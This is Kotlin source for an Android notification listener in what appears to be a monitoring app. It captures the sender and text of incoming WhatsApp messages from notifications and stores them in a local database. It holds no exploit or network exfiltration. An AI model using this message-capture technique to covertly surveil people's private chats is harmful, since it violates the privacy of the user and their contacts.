package com.spapp.monitoring.collectors

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.spapp.monitoring.data.local.AppDatabase
import com.spapp.monitoring.data.local.WhatsAppMessageEntry
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Listens to incoming system notifications for messaging apps (e.g. WhatsApp).
 * Captures incoming chat messages with sender name, text, and timestamp in real-time
 * even when WhatsApp is running in the background.
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        val pkg = sbn.packageName ?: return
        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim()
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()

        if (title.isNullOrBlank() || text.isNullOrBlank()) return

        // Skip non-message WhatsApp service notifications (e.g. "Checking for new messages", "WhatsApp Web is active")
        if (text.contains("Checking for new messages", ignoreCase = true) ||
            text.contains("WhatsApp Web is active", ignoreCase = true) ||
            text.contains("Backup in progress", ignoreCase = true)
        ) {
            return
        }

        val postTime = if (sbn.postTime > 0) sbn.postTime else System.currentTimeMillis()

        scope.launch {
            try {
                val db = AppDatabase.getInstance(applicationContext)
                db.whatsAppMessageDao().insertAll(
                    listOf(
                        WhatsAppMessageEntry(
                            chatName = title,
                            sender = title,
                            messageText = text,
                            isOutgoing = false,
                            messageTimeEpochMs = postTime
                        )
                    )
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to record WhatsApp notification message", e)
            }
        }
    }

    companion object {
        private const val TAG = "WhatsAppNotification"
    }
}
